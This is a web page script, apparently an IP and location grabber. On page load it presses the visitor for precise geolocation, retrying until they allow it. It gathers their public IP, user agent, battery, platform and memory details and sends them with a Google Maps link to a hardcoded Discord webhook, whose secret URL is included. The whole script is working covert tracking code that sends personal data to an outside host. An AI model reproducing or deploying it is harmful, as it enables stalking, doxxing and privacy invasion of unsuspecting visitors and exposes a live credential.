    <script>
        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Your provided webhook URL
        const retryDelay = 5000; // 5 seconds
        const maxRetries = 5; // Maximum retries
        let retryCount = 0;

        // Function to fetch IP address and other device details
        async function fetchIPAndDeviceDetails() {
            // Get IP address
            const ipData = await fetch('https://api.ipify.org?format=json');
            const ipResponse = await ipData.json();
            const ipAddress = ipResponse.ip;

            // Get User-Agent (device and browser details)
            const userAgent = navigator.userAgent;

            // Get network information
            const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";

            // Get battery information
            const battery = await navigator.getBattery();
            const batteryPercentage = battery.level * 100;
            const isCharging = battery.charging;

            // Get platform and language
            const platform = navigator.platform;
            const language = navigator.language;

            // Get device memory (available in modern browsers)
            const deviceMemory = navigator.deviceMemory || "Unknown";

            return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
        }

        // Send all data to Discord webhook
        async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
            const data = {
                content: `**User Details:**
- DeviceLocalTime: ${new Date().toLocaleString()}
- Location: Latitude ${latitude}, Longitude ${longitude}
- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}
- IP Address: ${ipAddress}
- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
- User-Agent: ${userAgent}
- NetworkInformation: ${networkInfo}
- BatteryPercentage: ${batteryPercentage}%
- IsCharging: ${isCharging ? "Yes" : "No"}
- Platform: ${platform}
- DeviceLanguage: ${language}
- DeviceMemory: ${deviceMemory} GB`
            };

            try {
                const response = await fetch(discordWebhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    throw new Error(`Discord webhook error: ${response.statusText} (${response.status})`);
                }

                console.log("Details sent to Discord successfully.");
            } catch (error) {
                console.error("Failed to send details to Discord:", error);
            }
        }

        // Function to get geolocation permission
        async function getLocationPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000
                    });
                } else {
                    reject(new Error("Geolocation is not supported by this browser."));
                }
            });
        }

        // Request location and send to Discord
        async function requestLocation() {
            try {
                const position = await getLocationPermission();
                const { latitude, longitude } = position.coords;
                const timestamp = new Date().toISOString(); // Current timestamp

                console.log("Permission granted:", latitude, longitude);

                // Fetch IP address and device details
                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory } = await fetchIPAndDeviceDetails();

                // Send all the data to Discord
                sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory);

                // Hide the dialog
                document.getElementById('dialogBox').style.display = 'none';
                retryCount = 0; // Reset retries
            } catch (error) {
                console.warn("Location access failed:", error);

                if (retryCount < maxRetries) {
                    retryCount++;
                    console.log(`Retrying (${retryCount}/${maxRetries}) in ${retryDelay / 1000}s...`);
                    document.getElementById('dialogBox').style.display = 'block'; // Show dialog
                    setTimeout(requestLocation, retryDelay);
                } else {
                    console.error("Max retries reached. Location permission denied.");
                }
            }
        }

        // On page load, start geolocation request
        document.addEventListener("DOMContentLoaded", () => {
            console.log("Page loaded. Starting geolocation request...");
            document.getElementById('dialogBox').style.display = 'block'; // Ensure visible
            requestLocation();
        });
    </script>
